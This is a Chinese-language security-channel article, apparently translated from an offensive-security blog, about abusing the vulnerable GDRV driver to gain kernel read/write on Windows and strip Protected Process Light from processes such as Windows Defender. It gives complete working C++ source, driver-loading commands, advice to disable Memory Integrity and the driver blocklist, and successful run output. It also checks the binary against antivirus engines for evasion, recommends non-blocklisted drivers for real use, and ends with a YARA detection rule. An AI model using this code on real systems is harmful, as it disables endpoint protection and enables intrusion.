#  利用存在漏洞的驱动程序 BYOVD 获取任意内核读/写权限并绕过 PPL 保护  
 Ots安全   2026-05-07 05:59  
  
**威胁简报**  
  
  
**恶意软件**  
  
  
**漏洞攻击**  
  
这项技术背后的原理很简单。我们不直接利用内核漏洞，而是将一个合法但存在漏洞的驱动程序加载到系统中。这个驱动程序使我们能够读写内核空间中的内存。  
  
利用这些任意内核读/写原语，我们可以修改操作系统中的敏感结构。在本例中，我们将使用它们来禁用目标进程的PPL保护，从而允许我们与这些进程进行交互。  
  
以下是一些讨论和探讨 PPL 保护机制的帖子列表：  
  
Windows PPL规避  
- https://medium.com/@s12deff/list/windows-ppl-evasion-dd598b2c8d28  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0Fw28o3ZzVLvehPRU8bLwKkTWn4ka78cAd9X99ASobMIIjMygIx0WuST1ibqso1O7LBAOD1iaqmpUCgiaHXXAO5JibGPq0EEMLecics/640?wx_fmt=png&from=appmsg "")  
  
**方法论**  
  
接下来，我们将在不查看完整代码的情况下解释其逻辑。这有助于在烹饪之前理解整个流程。  
  
要使用具有任意内核读/写权限的 BYOVD 实现 PPL 绕过，我们需要遵循以下逻辑步骤：  
  
**步骤 1：加载易受攻击的驱动程序**  
  
首先，我们需要在系统中加载并启动存在漏洞的驱动程序。这是该技术的核心，因为它使我们能够通过暴露的 IOCTL 或不安全的功能访问内核内存。  
  
**步骤二：启用所需权限**  
  
驱动程序加载完毕后，我们需要为当前进程启用SeDebugPrivilege权限。这非常重要，因为它允许我们不受限制地与受保护的系统进程进行交互。  
  
**步骤 3：解析内核信息**  
  
接下来，我们需要收集关键内核信息，包括：  
- 获取ntoskrnl.exe的基地址  
  
- 识别重要的结构偏移量（通常是针对目标操作系统版本硬编码的）  
  
这一步骤至关重要，因为我们需要精确的内存位置才能安全地执行内核读/写操作。  
  
**步骤 4：定位目标流程（EPROCESS）**  
  
获取内核基址和偏移量后，我们需要找到目标进程的EPROCESS结构。这一点至关重要，因为 PPL 保护是通过该结构中的字段来强制执行的。  
  
**步骤 5：修改保护措施（禁用 PPL）**  
  
通过对目标进程的任意内核读/写访问权限，我们可以直接修改保护字段。通过更改这些值，我们实际上禁用了目标进程的 PPL 保护，从而允许完全访问。  
  
**最终状态**  
  
最后，目标进程不再受 PPL 保护，我们可以自由地与其交互（例如，打开句柄、读/写内存、注入代码等）。  
```
Userland Process
        │
        ▼
Load Vulnerable Driver (BYOVD)
        │
        ▼
Gain Kernel R/W
        │
        ▼
Locate ntoskrnl + EPROCESS
        │
        ▼
Modify Protection Fields
        │
        ▼
PPL Disabled
```  
  
**执行**  
  
现在，我们来看看如何将这个逻辑转换成 C++ 代码。我已经把最重要的部分分解开了。  
  
**加载易受攻击的驱动程序**  
  
在这种情况下，我们使用了与上一篇文章中相同的易受攻击的驱动程序，即名为GDRV 的驱动程序，该驱动程序在CVE-2018-19320中被利用。  
  
您可以点击以下链接直接从LolDrivers网站下载驱动程序：  
  
https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/  
  
要加载此驱动程序，您需要禁用Windows 内存完整性保护和Microsoft易受伤害的驱动程序黑名单，两者都是内核隔离安全功能的一部分（或者使用未被列入黑名单的驱动程序）。  
  
要加载驱动程序，请记住，您可以使用 C++ 代码，或者仅用于测试，请以管理员身份在 CMD 中运行该命令：  
```
sc.exe create gdrv.sys binPath=C:\windows\temp\gdrv.sys type =kernel && sc.exe start gdrv.sys
```  
  
**启用所需权限**  
  
用于获取SeDebugPrivilege 的代码是以下这种典型代码，因此您需要管理员权限才能运行该程序：  
```
BOOL EnableSeDebugPrivilege(){
 HANDLE hToken;
 TOKEN_PRIVILEGES tp;
 LUID luid;
 if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 {
  std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
  return FALSE;
 }
 if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
 {
  std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 tp.PrivilegeCount = 1;
 tp.Privileges[0].Luid = luid;
 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
 {
  std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 CloseHandle(hToken);
 return TRUE;
}
```  
  
**解析内核信息**  
  
然后我们需要解决两个不同的信息：  
1. 内核偏移量  
  
1. nsoskrnl.exe 基地址  
  
我们先从内核偏移量开始：  
  
在我们的例子中，我们只是将其硬编码，在实际生产操作中，您需要从互联网符号参考中解析信息，或者直接在您的项目中硬编码所有 Windows 版本所需的信息。  
  
就我而言，硬编码的那些是：  
```
struct offsets {
 ULONG64 ActiveProcessLinks;
 ULONG64 UniqueProcessId;
 ULONG64 Protection;
 ULONG64 PsLoadedModuleList;
 ULONG64 PsInitialSystemProcess;
} g_offsets = {
 0x1d8, // ActiveProcessLinks (Inspect the dt nt!_EPROCESS)
 0x1d0, // UniqueProcessId (Inspect the dt nt!_EPROCESS)
 0x5fa, // Protection (Inspect the dt nt!_EPROCESS)
 0xEF50C0, // PsLoadedModuleList (ntoskrnl.exe base address - PsLoadedModuleList = ? nt!PsLoadedModuleList - nt)
 0xFC5ab0  // PsInitialSystemProcess (ntoskrnl.exe base address - PsInitialSystemProcess = ? nt!PsInitialSystemProcess - nt)
};
```  
  
在上一篇文章中，您可以找到更多关于从EPROCESS 获取偏移量的信息。  
  
现在，让我们获取nsoskrnl.exe的基地址：  
  
为此，我们只需要列出所有驱动程序，搜索ntoskrnl.exe并获取其基本地址：  
  
**列出Drivers：**  
```
std::vector<KernelDriver> GetSortedKernelDrivers() {
 std::vector<KernelDriver> driverList;

 auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
  GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

 if (!NtQuerySystemInformation) return driverList;

 ULONG len = 0;
 const int SystemModuleInformation = 11;

 NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

 std::vector<BYTE> buffer(len);
 NTSTATUS status = NtQuerySystemInformation(
  (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
  buffer.data(),
  len,
  &len
 );

 if (status != 0) return driverList; // STATUS_SUCCESS = 0

 auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

 for (ULONG i = 0; i < mods->Count; i++) {
  SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

  KernelDriver drv;
  drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
  drv.Size = entry.ImageSize;

  const char* nameStart = reinterpret_cast<const char*>(entry.FullPathName) + entry.OffsetToFileName;
  drv.Name = std::string(nameStart);

  driverList.push_back(drv);
 }

 std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
  return a.BaseAddress < b.BaseAddress;
  });

 return driverList;
}
```  
  
此函数用于NtQuerySystemInformation检索所有已加载内核驱动程序的列表，并将它们的基本地址、大小和名称提取到一个向量中。最后，它按基本地址对驱动程序进行排序，这有助于识别ntoskrnl.exe模块。  
  
然后我们将司机列表发送到以下函数：  
```
DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) { 
 if (drivers.empty()) { 
  return  0 ; 
} 

 for (const auto& drv : drivers) { 
  std::string nameLower = drv.Name; 
  std::transform(nameLower. begin (), nameLower. end (), nameLower. begin (), : :tolower ); 

  if (nameLower.find( "ntoskrnl.exe" ) != std::string::npos | | 
   nameLower.find( "ntkrnl" ) != std::string::npos) { 
   return ( DWORD64 )drv.BaseAddress; 
  } 
} 

 return  0 ; 
}
```  
  
此函数遍历驱动程序列表，查找ntoskrnl.exe（或ntkrnl），并在找到后返回其基地址。  
  
**定位目标流程（EPROCESS）**  
  
然后我们调用 getEPROCESS 函数，将易受攻击的驱动程序句柄、ntoskrnl.exe的基地址和目标进程 ID发送给它。  
```
DWORD64  eprocess  = getEPROCESS(drv, ntoskrnlBase, pid);
```  
  
在函数内部，我们执行以下步骤：  
1. 使用以下命令获取系统进程（PID 4）的EPROCESS结构PsInitialSystemProcess  
  
1. 使用此ActiveProcessLinks字段访问进程的链表。  
  
1. 使用Flink（前向链接）遍历列表，以移动到下一个 EPROCESS。  
  
1. 重复此过程，直到找到目标PID。  
  
这个函数之所以有效，是因为 Windows 中所有的EPROCESS结构都通过一个双向链表链接在一起。我们从系统进程（PID 4）ActiveProcessLinks开始，因为始终可以通过该字段访问，所以我们可以沿着Flink（前向链接）指针从一个进程跳转到下一个进程。PsInitialSystemProcess  
```
DWORD64 getEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, DWORD pid)
{
 if (ntoskrnlBase == 0)
 {
  std::cerr << "Failed to find ntoskrnl.exe base address." << std::endl;
  return 0;
 }

 DWORD64 initialSystemProcess = ntoskrnlBase + g_offsets.PsInitialSystemProcess;  // Get EPROCESS of the System process (PID 4)
 cout << "PsInitialSystemProcess address " << initialSystemProcess << endl;

 getchar();
 // Open Driver

 getchar();
 // Read Primitive to get EPROCESS structure from System Process
 DWORD64 systemEPROCESS = 0;
 BOOL readResult = ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)initialSystemProcess, sizeof(DWORD64));
 cout << "System EPROCESS: " << systemEPROCESS << endl;


 // Make sure that the EPROCESS is not from the PID 4 (System)
 DWORD systemPid = 0;
 BOOL readPIDSystemResult = ReadPrimitive(drv, &systemPid, (LPVOID)(uintptr_t)(systemEPROCESS + g_offsets.UniqueProcessId), sizeof(DWORD));
 cout << "System PID: " << systemPid << endl;
 if (systemPid == pid) {
  return systemEPROCESS; // If the target process is SYSTEM (PID 4) we already have it
 }

 // Walk through the whole list
 DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
 cout << "headList address :" << headList << endl;

 // Get first process
 DWORD64 firstProcess = 0;
 BOOL readFirstResult = ReadPrimitive(drv, &firstProcess, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));
 if (!readFirstResult) {
  cout << "Failed getting first process" << endl;
 } 
 cout << "First Flink: " << firstProcess << endl;


 DWORD64 currentProcess = firstProcess;
 int counter = 0;
 getchar();
 cout << "Starting while " << endl;
 while (currentProcess != headList && counter < 5000) {
  counter++;

  DWORD64 eprocess = currentProcess - g_offsets.ActiveProcessLinks;
  cout << "Checking EPROCESS " << eprocess << endl;

  // Read PID
  DWORD currentPid = 0;
  BOOL readPIDResult = ReadPrimitive(drv, &currentPid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD));
  if (!readPIDResult) {
   cout << "Error getting current PID " << endl;
  }
  cout << "Current PID " << currentPid << endl;

  if (currentPid == pid) {
   cout << "Correct EPROCESS Found " << endl;
   return eprocess;
  }

  // Read next one
  DWORD64 nextProcess = 0;
  BOOL readNextResult = ReadPrimitive(drv, &nextProcess, (LPVOID)(uintptr_t)currentProcess, sizeof(DWORD64));
  if (!readNextResult) {
   cout << "Error getting next result " << endl;
  }

  currentProcess = nextProcess;
 }

 cout << "PID Not found after checking all processes " << endl;
 return 0; 
}
```  
  
**修改保护（禁用 PPL）**  
  
当我们有了目标进程的 EPROCESS 结构时，就可以用第一个发现的偏移量写保护结构值：  
```
BOOL disablePPL(HANDLE drv, DWORD64 eprocess) {
 // Offsets relative to the Protection field in EPROCESS
 // SignatureLevel        = Protection - 2
 // SectionSignatureLevel = Protection - 1
 // Protection            = Protection

 DWORD64 ppl = eprocess + g_offsets.Protection;
 BYTE zero = 0;

 DWORD value = 0;
 BOOL firstWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 2), &zero, sizeof(BYTE));
 if (!firstWritePPL) {
  cout << "First error writing the PPL " << endl;
  return false;
 }

 getchar();

 BOOL secondWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 1), &zero, sizeof(BYTE));
 if (!secondWritePPL) {
  cout << "Second error writing the PPL " << endl;
  return false;
 }

 getchar();


 // Write Protection
 BOOL writePPL = WritePrimitive(drv, (LPVOID)ppl, &zero, sizeof(BYTE));
 if (!writePPL) {
  cout << "Error writing the PPL " << endl;
  return false;
 }
 cout << "Successfully removed PPL" << endl;
 return true;
}
```  
  
在这个函数中，我们使用内核写入原语直接修改目标进程EPROCESS结构体中与保护相关的字段。通过将 `<protection_field>`、`<protection_field>` 和 `<protection_field>` 的值覆盖SignatureLevel为零SectionSignatureLevel，Protection我们有效地移除了 PPL 限制，使进程不再受保护 ;)  
  
**代码**  
  
让我们来查看完整的代码，这里有两个不同的文件：  
  
**main.cpp**  
```
#include <Windows.h>
#include <winternl.h>
#include <vector>
#include <string>
#include <algorithm>
#include <iostream>
#include "DriverOps.h"

using namespace std;

typedef struct _SYSTEM_MODULE_ENTRY {
 HANDLE Section;
 PVOID MappedBase;
 PVOID ImageBase;
 ULONG ImageSize;
 ULONG Flags;
 USHORT LoadOrderIndex;
 USHORT InitOrderIndex;
 USHORT LoadCount;
 USHORT OffsetToFileName;
 UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
 ULONG Count;
 SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

struct KernelDriver {
 std::string Name;
 uintptr_t BaseAddress;
 uint32_t Size;
};

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
 SYSTEM_INFORMATION_CLASS SystemInformationClass,
 PVOID SystemInformation,
 ULONG SystemInformationLength,
 PULONG ReturnLength
 );

// 1- Enable SeDebugPrivilege for the current process
// 2- Get offsets (hardcoded)
// 3- List all drivers
// 4- Get ntoskrnl.exe address
// 5- Get EPROCESS of the target process
// 6- Disable PPL

struct offsets {
 ULONG64 ActiveProcessLinks;
 ULONG64 UniqueProcessId;
 ULONG64 Protection;
 ULONG64 PsLoadedModuleList;
 ULONG64 PsInitialSystemProcess;
} g_offsets = {
 0x1d8, // ActiveProcessLinks
 0x1d0, // UniqueProcessId
 0x5fa, // Protection
 0xEF50C0, // PsLoadedModuleList (ntoskrnl.exe base address - PsLoadedModuleList = ? nt!PsLoadedModuleList - nt)
 0xFC5ab0  // PsInitialSystemProcess (ntoskrnl.exe base address - PsInitialSystemProcess = ? nt!PsInitialSystemProcess - nt)
};

std::vector<KernelDriver> GetSortedKernelDrivers() {
 std::vector<KernelDriver> driverList;

 auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
  GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

 if (!NtQuerySystemInformation) return driverList;

 ULONG len = 0;
 const int SystemModuleInformation = 11;

 NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

 std::vector<BYTE> buffer(len);
 NTSTATUS status = NtQuerySystemInformation(
  (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
  buffer.data(),
  len,
  &len
 );

 if (status != 0) return driverList; // STATUS_SUCCESS = 0

 auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

 for (ULONG i = 0; i < mods->Count; i++) {
  SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

  KernelDriver drv;
  drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
  drv.Size = entry.ImageSize;

  const char* nameStart = reinterpret_cast<const char*>(entry.FullPathName) + entry.OffsetToFileName;
  drv.Name = std::string(nameStart);

  driverList.push_back(drv);
 }

 std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
  return a.BaseAddress < b.BaseAddress;
  });

 return driverList;
}

DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) {
 if (drivers.empty()) {
  return 0;
 }

 for (const auto& drv : drivers) {
  std::string nameLower = drv.Name;
  std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

  if (nameLower.find("ntoskrnl.exe") != std::string::npos ||
   nameLower.find("ntkrnl") != std::string::npos) {
   return (DWORD64)drv.BaseAddress;
  }
 }

 return 0;
}

DWORD64 getEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, DWORD pid)
{
 if (ntoskrnlBase == 0)
 {
  std::cerr << "Failed to find ntoskrnl.exe base address." << std::endl;
  return 0;
 }

 DWORD64 initialSystemProcess = ntoskrnlBase + g_offsets.PsInitialSystemProcess;  // Get EPROCESS of the System process (PID 4)
 cout << "PsInitialSystemProcess address " << initialSystemProcess << endl;

 getchar();
 // Open Driver

 getchar();
 // Read Primitive to get EPROCESS structure from System Process
 DWORD64 systemEPROCESS = 0;
 BOOL readResult = ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)initialSystemProcess, sizeof(DWORD64));
 cout << "System EPROCESS: " << systemEPROCESS << endl;


 // Make sure that the EPROCESS is not from the PID 4 (System)
 DWORD systemPid = 0;
 BOOL readPIDSystemResult = ReadPrimitive(drv, &systemPid, (LPVOID)(uintptr_t)(systemEPROCESS + g_offsets.UniqueProcessId), sizeof(DWORD));
 cout << "System PID: " << systemPid << endl;
 if (systemPid == pid) {
  return systemEPROCESS; // If the target process is SYSTEM (PID 4) we already have it
 }

 // Walk through the whole list
 DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
 cout << "headList address :" << headList << endl;

 // Get first process
 DWORD64 firstProcess = 0;
 BOOL readFirstResult = ReadPrimitive(drv, &firstProcess, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));
 if (!readFirstResult) {
  cout << "Failed getting first process" << endl;
 } 
 cout << "First Flink: " << firstProcess << endl;


 DWORD64 currentProcess = firstProcess;
 int counter = 0;
 getchar();
 cout << "Starting while " << endl;
 while (currentProcess != headList && counter < 5000) {
  counter++;

  DWORD64 eprocess = currentProcess - g_offsets.ActiveProcessLinks;
  cout << "Checking EPROCESS " << eprocess << endl;

  // Read PID
  DWORD currentPid = 0;
  BOOL readPIDResult = ReadPrimitive(drv, &currentPid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD));
  if (!readPIDResult) {
   cout << "Error getting current PID " << endl;
  }
  cout << "Current PID " << currentPid << endl;

  if (currentPid == pid) {
   cout << "Correct EPROCESS Found " << endl;
   return eprocess;
  }

  // Read next one
  DWORD64 nextProcess = 0;
  BOOL readNextResult = ReadPrimitive(drv, &nextProcess, (LPVOID)(uintptr_t)currentProcess, sizeof(DWORD64));
  if (!readNextResult) {
   cout << "Error getting next result " << endl;
  }

  currentProcess = nextProcess;
 }

 cout << "PID Not found after checking all processes " << endl;
 return 0; 
}

BOOL disablePPL(HANDLE drv, DWORD64 eprocess) {
 // Offsets relative to the Protection field in EPROCESS
 // SignatureLevel        = Protection - 2
 // SectionSignatureLevel = Protection - 1
 // Protection            = Protection

 DWORD64 ppl = eprocess + g_offsets.Protection;
 BYTE zero = 0;

 DWORD value = 0;
 BOOL firstWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 2), &zero, sizeof(BYTE));
 if (!firstWritePPL) {
  cout << "First error writing the PPL " << endl;
  return false;
 }

 getchar();

 BOOL secondWritePPL = WritePrimitive(drv, (LPVOID)(ppl - 1), &zero, sizeof(BYTE));
 if (!secondWritePPL) {
  cout << "Second error writing the PPL " << endl;
  return false;
 }

 getchar();


 // Write Protection
 BOOL writePPL = WritePrimitive(drv, (LPVOID)ppl, &zero, sizeof(BYTE));
 if (!writePPL) {
  cout << "Error writing the PPL " << endl;
  return false;
 }
 cout << "Successfully removed PPL" << endl;
 return true;
}


BOOL EnableSeDebugPrivilege()
{
 HANDLE hToken;
 TOKEN_PRIVILEGES tp;
 LUID luid;
 if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 {
  std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
  return FALSE;
 }
 if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
 {
  std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 tp.PrivilegeCount = 1;
 tp.Privileges[0].Luid = luid;
 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
 {
  std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
  CloseHandle(hToken);
  return FALSE;
 }
 CloseHandle(hToken);
 return TRUE;
}


int main(int argc, char* argv[])
{
 DWORD pid = 0;
 if(argc > 1)
 {
  pid = atoi(argv[1]);
 }
 else
 {
  std::cout << "Usage: PPLDisableFromRWKernel.exe <PID>" << std::endl;
  return 1;
 }

 // 1. Enable SeDebugPrivilege for the current process
 BOOL setPriv = EnableSeDebugPrivilege();

 // 2. Get offsets (hardcoded)

 // 3. List all drivers
 vector<KernelDriver> drivers = GetSortedKernelDrivers();

 // 4. Get ntoskrnl.exe address
 DWORD64 ntoskrnlBase = GetNtoskrnlBase(drivers);
 cout << "NTOSKRNL Base address " << ntoskrnlBase << endl;
 getchar();

 HANDLE drv = openVulnDriver();

 // 5. Get EPROCESS of the target process
 DWORD64 eprocess = getEPROCESS(drv, ntoskrnlBase, pid);
 cout << "EPROCESS " << eprocess << endl;
 getchar();

 if (eprocess) {
  // 6- Disable PPL
  BOOL finalDisable = disablePPL(drv, eprocess);
  if (finalDisable) {
   cout << "[!] PPL Protection removed !" << endl;
   return 0;
  }
 }
 return 0;
}
```  
  
**DriverOps.h（来自上一篇文章）**  
```
#include <iostream>
#include <Windows.h>

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/

#define IOCTL_READWRITE_PRIMITIVE 0xC3502808

using namespace std;

typedef struct KernelWritePrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelWritePrimitive;

typedef struct KernelReadPrimitive {
 LPVOID dst;
 LPVOID src;
 DWORD size;
} KernelReadPrimitive;

BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelWritePrimitive kwp;
 kwp.dst = dst;
 kwp.src = src;
 kwp.size = size;

 BYTE bufferReturned[48] = { 0 };
 DWORD returned = 0;
 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
 if (!result) {
  cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
 KernelReadPrimitive krp;
 krp.dst = dst;
 krp.src = src;
 krp.size = size;


 DWORD returned = 0;

 BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
 if (!result) {
  cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
  return FALSE;
 }
 cout << "Read primitive sent successfully. Bytes returned: " << returned << endl;
 return TRUE;
}

HANDLE openVulnDriver() {
 HANDLE driver = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 if (!driver || driver == INVALID_HANDLE_VALUE)
 {
  cout << "Failed to open handle to driver. Error code: " << GetLastError() << endl;
  return NULL;
 }
 return driver;
}
```  
  
**概念验证**  
  
Windows 11：  
  
我们先来测试一下代码，确保服务正在运行：  
```
sc start gdrv
```  
  
然后只需以管理员身份从CMD 或 PowerShell 控制台执行即可：  
```
Checking EPROCESS 18446614925235277952
Read primitive sent successfully. Bytes returned: 0
Current PID 3412
Read primitive sent successfully. Bytes returned: 0
Checking EPROCESS 18446614925235253376
Read primitive sent successfully. Bytes returned: 0
Current PID 3432
Correct EPROCESS Found
EPROCESS 18446614925235253376

Disable PPL

Write primitive sent successfully. Bytes returned: 0

Write primitive sent successfully. Bytes returned: 0

Write primitive sent successfully. Bytes returned: 0
Successfully removed PPL
[!] PPL Protection removed !
```  
  
Windows Defender 已不再受保护：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0GwPdDuccBV1pPia59UdbZwbXkSibuWA164dd9WX0adNUKjr7bHDCMIJKwicYKXH5Sot02NhT1Mwoic6AdM6dSBGgf8nGEFaoFib16s/640?wx_fmt=png&from=appmsg "")  
  
**检测**  
  
现在需要检查防御系统是否将.exe文件检测为恶意威胁。如果驱动程序被检测为恶意，则需要使用另一个未被列入黑名单的易受攻击的驱动程序，如下所示：  
  
**Kleenscan**  
```
Alyac: Undetected
Amiti: Undetected
Arcabit: Undetected
Avast: Undetected
AVG: Undetected
Avira: Undetected
Bullguard: Undetected
ClamAV: Undetected
Comodo Linux: Undetected
Crowdstrike Falcon: Undetected
DrWeb: Undetected
Emsisoft: Pending
eScan: Undetected
F-Prot: Undetected
F-Secure: Undetected
G Data: Undetected
IKARUS: Undetected
Immunet: Undetected
Kaspersky: Scan failed
Max Secure: Undetected
McAfee: Undetected
Microsoft Defender: Trojan:Win32/Sabsik.RD.A!ml
NANO: Undetected
NOD32: Undetected
Norman: Undetected
SecureAge APEX: Unknown
Seqrite: Undetected
Sophos: Undetected
Threatdown: Undetected
TrendMicro: Undetected
Vba32: Undetected
VirusFighter: Undetected
Xvirus: Undetected
Zillya: Undetected
Zonealarm: Undetected
Zoner: Undetected
```  
  
**Litterbox**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0Fntib2JEocNjzXP8ibG5436gdrL18JyLIibiaW3sDgqZ2mm8S5zDoMEK4OmOS34TOf1ic97JSoqFqPfxuF8avTUow9MkgnrGttzdFM/640?wx_fmt=webp&from=appmsg "")  
  
**ThreatCheck**  
```
ThreatCheck.exe -f Z:\PPLDisableFromRWKernel.exe
[+] No threat found!
[*] Run time: 0.81s
```  
  
**Windows Defender**  
  
检测到驱动程序存在漏洞，但未检测到 .exe 文件为恶意软件。  
  
**Kaspersky Free AV**  
  
Static .exe analysis:  
```
Instant File Analysis

    Status: Completed less than a minute ago

    Duration: 0 seconds

    Objects scanned: 2

    No threats have been detected
```  
  
  
**Bitdefender Free AV**  
  
Static .exe  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0FpU0oyiaaP8StMx1JlaFYnDHD6lLiaO6tozV58gwUp0sMBcvfYm5wribgld7xu6UTwheXn0eicX1LqFfTxcYDpUg9ia4XOQ5U7cvtY/640?wx_fmt=webp&from=appmsg "")  
  
**YARA**  
```
rule BYOVD_KernelRW_PPL_Bypass_Generic
{
    meta:
        author = "0x12 Dark Development"
        description = "Detects potential BYOVD usage with kernel R/W primitives targeting PPL bypass"
        date = "2026-03-18"
        reference = "Generic detection for vulnerable driver abuse and PPL tampering"

    strings:
        // Native API usage for driver/module enumeration
        $ntquery = "NtQuerySystemInformation" ascii wide
        $sysinfo_class = "SystemModuleInformation" ascii wide

        // Kernel / driver related indicators
        $ntdll = "ntdll.dll" ascii wide
        $device = "\\\\.\\ " ascii wide nocase
        $ioctl = "DeviceIoControl" ascii wide

        // Common kernel structures / targets
        $eprocess = "EPROCESS" ascii wide nocase
        $protection = "Protection" ascii wide nocase
        $siglevel = "SignatureLevel" ascii wide nocase

        // Privilege escalation / debugging
        $sedebug = "SeDebugPrivilege" ascii wide

        // Typical kernel primitives naming (generic, not exact)
        $read = "ReadPrimitive" ascii wide nocase
        $write = "WritePrimitive" ascii wide nocase

        // Kernel base / ntoskrnl hunting
        $ntos = "ntoskrnl.exe" ascii wide nocase
        $psinit = "PsInitialSystemProcess" ascii wide
        $psloaded = "PsLoadedModuleList" ascii wide

    condition:
        // Require a combination of behaviors, not just one indicator
        (
            $ntquery and $sysinfo_class and
            2 of ($ntos, $psinit, $psloaded)
        )
        and
        (
            $ioctl or $device
        )
        and
        (
            2 of ($eprocess, $protection, $siglevel)
        )
        and
        (
            $write or $read
        )
}
```  
  
**结论**  
  
本文探讨了如何利用 BYOVD 通过任意内核读/写原语绕过 PPL 保护，直接修改EPROCESS目标进程的结构。通过将易受攻击的驱动程序与对内核的精细操作相结合PsInitialSystemProcess，我们成功地将 `<path> `、`<name>` 和`<name>` 字段ActiveProcessLinks清零，从而完全移除了 PPL 限制。SignatureLevelSectionSignatureLevelProtection  
  
如检测部分所示，该技术本身基本不会被大多数防病毒引擎检测到，但驱动程序的情况则有所不同——选择一个未被列入黑名单的驱动程序对于实际使用至关重要。  
  
**END**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0FeVpQb8yU8TvLv3Aicf3ZSA5gcs3cy6hQjAjkURe1eY9yRlTEem9g5UicUgrLNPIjUUc4LkfpnaYFKQwguicYWu4nydqzAWtib45c/640?wx_fmt=jpeg&from=appmsg "")  
  
  
公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址  
  
排版 编辑 | Ots 小安   
  
采集 翻译 | Ots Ai牛马  
  
公众号 |   
AnQuan7 (Ots安全)  
  
